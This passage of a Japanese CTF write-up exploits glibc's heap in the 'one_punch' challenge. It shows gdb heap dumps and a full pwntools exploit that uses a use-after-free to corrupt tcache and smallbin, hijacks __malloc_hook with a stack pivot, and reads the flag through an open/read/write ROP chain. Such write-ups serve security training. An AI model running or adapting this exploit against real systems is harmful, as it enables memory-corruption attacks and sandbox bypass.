0x7ffff7fb4d90 <main_arena+336>:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
0x7ffff7fb4da0 <main_arena+352>:        0x000055555555cc80      0x000055555555c460
```
calloc による確保が完了した後の結果は予想どおりで、`fake_chunk` としての `0x000055555555901f` の `fd` も `libc` のアドレスに書き換えられました。
```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x700 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](7): 0x55555555cc90 --> 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x210)   tcache_entry[31](144): 0
(0x220)   tcache_entry[32](77): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x230)   tcache_entry[33](251): 0
(0x240)   tcache_entry[34](247): 0
(0x250)   tcache_entry[35](255): 0
(0x260)   tcache_entry[36](127): 0
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x000055555555901f+0x10
0x55555555902f: 0x00007ffff7fb4d90      0x0000000000000000
0x55555555903f: 0x0000000000000000      0x0000000000000000
```
サンドボックス保護のため、`execve` の関数呼び出しは実行できず、`open/read/write` で flag を読み取るしかありません。バックドア関数を呼び出して `__malloc_hook` を `gadget(mov eax, esi ; add rsp, 0x48 ; ret)` に書き換えることにします。これにより、add のときに `rsp` を制御可能な入力領域に移し、`rop chains` を呼び出して `orw` で `flag` を読み取ります。

完全な exp は次のとおりです。

```python
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./one_punch')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./one_punch')

def Add(idx,name):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)


def Edit(idx,name):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)

def Show(idx):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def BackDoor(buf):
    p.recvuntil('> ')
    p.sendline('50056')
    sleep(0.1)
    p.send(buf)

def exp():
    #leak heap
    for i in range(7):
        Add(0,'a'*0x120)
        Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
    log.success("[+]heap base => "+ hex(heap_base))
    #leak libc
    Add(0,'a'*0x120)
    Add(1,'a'*0x400)
    Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
    log.success("[+]libc base => " + hex(libc_base))
    #
    for i in range(6):
        Add(0,'a'*0xf0)
        Delete(0)
    for i in range(7):
        Add(0,'a'*0x400)
        Delete(0)
    Add(0,'a'*0x400)
    Add(1,'a'*0x400)
    Add(1,'a'*0x400)
    Add(2,'a'*0x400)
    Delete(0)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    #agagin
    Delete(1)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    Edit(2,'./flag'.ljust(8,'\x00'))
    Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))

    #trigger
    Add(0,'a'*0x217)

    Delete(0)
    Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
    #gdb.attach(p,'b calloc')
    Add(0,'a'*0xf0)

    BackDoor('a')
    #mov eax, esi ; add rsp, 0x48 ; ret
    #magic_gadget = libc_base + libc.sym['setcontext']+53
    # add rsp, 0x48 ; ret
    magic_gadget = libc_base + 0x000000000008cfd6
    payload = p64(magic_gadget)

    BackDoor(payload)

    p_rdi = libc_base + 0x0000000000026542
    p_rsi = libc_base + 0x0000000000026f9e
    p_rdx = libc_base + 0x000000000012bda6
    p_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x00000000000cf6c5
    rop_heap = heap_base + 0x44b0

    rops = p64(p_rdi)+p64(rop_heap)
    rops += p64(p_rsi)+p64(0)
    rops += p64(p_rdx)+p64(0)
    rops += p64(p_rax)+p64(2)
    rops += p64(syscall)
    #rops += p64(libc.sym['open'])
    #read
    rops += p64(p_rdi)+p64(3)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(0)
    rops += p64(syscall)
    #rops += p64(libc.sym['read'])
    #write
    rops += p64(p_rdi)+p64(1)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(1)
    rops += p64(syscall)
    Add(0,rops)
    p.interactive('$ xmzyshypnc')

exp()
```

### 0x06 推奨演習問題:

* 2018 HITCON children_tcache
* 2018 BCTF houseOfAtum
* 2019 HITCON Lazy House
* 2020 XCTF no-Cov twochunk
